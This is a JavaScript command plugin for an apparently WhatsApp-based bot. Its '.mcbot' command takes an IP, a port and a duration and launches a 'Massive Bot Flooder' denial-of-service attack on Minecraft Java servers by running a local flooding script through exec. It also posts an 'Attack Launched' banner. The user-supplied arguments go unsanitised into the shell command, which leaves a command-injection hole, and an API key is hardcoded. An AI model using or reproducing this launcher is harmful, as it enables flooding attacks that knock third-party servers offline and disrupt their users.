const axios = require('axios')
const { exec } = require('child_process');



const cooldowns = new Map();

let handler = async (m, { conn, command, args }) => {
  if (args.length < 3) return conn.reply(m.chat, '\`\`\`[🔎] .mcbot [ip] [port] [duration]\`\`\`\n\`Massive Bot Flooder To Minecraft Java Server [Crack]\`', m);
  const user = m.sender;
  const cooldownTime = 60 * 1000;
  if (cooldowns.has(user)) {
    const remainingCooldown = cooldowns.get(user) - Date.now();
    if (remainingCooldown > 0) {
      return conn.reply(
        m.chat,
        `❌ Command is on cooldown. Please wait ${Math.ceil(remainingCooldown / 1000)} seconds.`,
        m
      );
    }
  }

  const blacklistedDomains = ['127.0.0.1', '1.1.1.1', '192.168.0.1', '8.8.8.8', 'localhost', '0.0.0.0'];

  if (blacklistedDomains.some(domain => args[0].includes(domain))) {
    return conn.reply(m.chat, '❌ Blacklisted Target.', m);
  } 
  const ip = args[0]
  const port = args[1]
  const duration = args[2]
  const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
  const details = `╒═════════════════╕
│       Attack Launched          │
╞═════════════════╛
│ Creator: PermenMD
│ Host: ${ip}
│ Port: ${port}
│ Methods: StarsXMCBot
│ Duration: ${duration}
│ Check-Host: Click Thumbnail
╘═════════════════╛`
  
conn.sendMessage(m.chat, { contextInfo: {
externalAdReply: {
showAdAttribution: true, 
title: `Attacking ${ip}:${port}`,
body: `Check Server Click Me`,
mediaType: 1,  
renderLargerThumbnail : true,
thumbnailUrl: `https://telegra.ph/file/f1a73ef83b86979b9c776.png`,
sourceUrl: `https://mcsrvstat.us/server/${ip}:${port}`
}}, text: details}, {quoted: m})
    cooldowns.set(user, Date.now() + cooldownTime);
	exec(`node ./lib/PermenMD/StarsXMc.js ${ip} ${port} ${duration}`)
  }
        

handler.help = ['mcbot'].map(v => v + ' <ip> <port> <duration>');
handler.tags = ['attack'];
handler.owner = true
handler.rowner = true
handler.command = ['mcbot']

module.exports = handler;